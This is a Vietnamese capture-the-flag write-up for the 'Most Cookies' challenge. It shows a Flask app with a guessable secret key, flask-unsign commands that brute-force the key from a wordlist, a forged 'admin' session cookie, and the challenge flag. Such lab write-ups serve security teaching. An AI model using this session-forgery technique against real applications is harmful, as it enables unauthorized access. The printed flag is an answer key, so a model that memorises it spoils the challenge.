# Most Cookies

Bản chất & Ví dụ: - Flask signed cookie: Flask có thể lưu session trong cookie đã ký.- Signed không phải encrypted: Người dùng vẫn có thể thấy dữ liệu, nhưng sửa sẽ invalid nếu không có secret.- Secret key: Nếu yếu, có thể forge session.
Hệ sinh thái kiến thức: - Flask session cookie- Signed cookie- Secret key- Wordlist brute force- Session integrity
Trạng thái: Chưa bắt đầu
Trạng thái 1: Chưa bắt đầu

![image.png](Most%20Cookies/image.png)

Theo đề bài chúng ta thấy được đây là 1 bài liên quan đến cookie và cụ thể là Flask session cookies

server.py

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag.txt").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
print(app.secret_key)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run(host='0.0.0.0', port=8000)

```

- Đọc `server.py`, mình thấy `app.secret_key` được chọn ngẫu nhiên từ mảng `cookie_names` lộ sẵn trong source
    
    ```
    cookie_names = ["snickerdoodle", "chocolate chip", ...]
    app.secret_key = random.choice(cookie_names)
    ```
    
    Tại route `/display`, điều kiện in ra cờ là `session["very_auth"]` phải bằng `"admin"`:
    
    ```
    if session.get("very_auth"):
        check = session["very_auth"]
        if check == "admin":
            resp = make_response(render_template("flag.html", value=flag_value, title=title))
    ```
    
- **Hướng làm:** Mình lưu mảng `cookie_names` thành file `wordlist.txt`, lấy session cookie mặc định trên web để brute-force tìm `secret_key` đang dùng, rồi forge (ký) lại cookie chứa payload `"admin"`.

wordlist.txt

```python
snickerdoodle
chocolatechip
oatmealraisin
gingersnap
shortbread
peanutbutter
whoopiepie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
blackandwhite
whitechocolatemacadamia
```

![image.png](Most%20Cookies/image%201.png)

Mình vào burp suite để lấy giá trị cookie 

```python
➜  ~ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.as7zKQ.89tnyfWVjuVJ97-gHF3gQ9-fwIU" --wordlist wordlist.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptsdamia
'gingerbread'
➜  ~
```

Có được key là gingerbread
Mình dùng tiếp lệnh `flask-unsign --sign` với secret key `'gingerbread'` này để tạo (forge) một session cookie mới chứa payload `{'very_auth': 'admin'}`

```python
➜  ~ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'gingerbread'                                       
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.as7z8A.xp172JEv-Iyq_kZYy65KUvxF1xU
➜  ~
```

Sau khi có được cookie thì mình sẽ thay thế cookie cũ và tiến hành truy cập vào đường dẫn /display để nhận cờ 

![image.png](Most%20Cookies/image%202.png)

academy{cO0ki3s_yum_7ea44b33}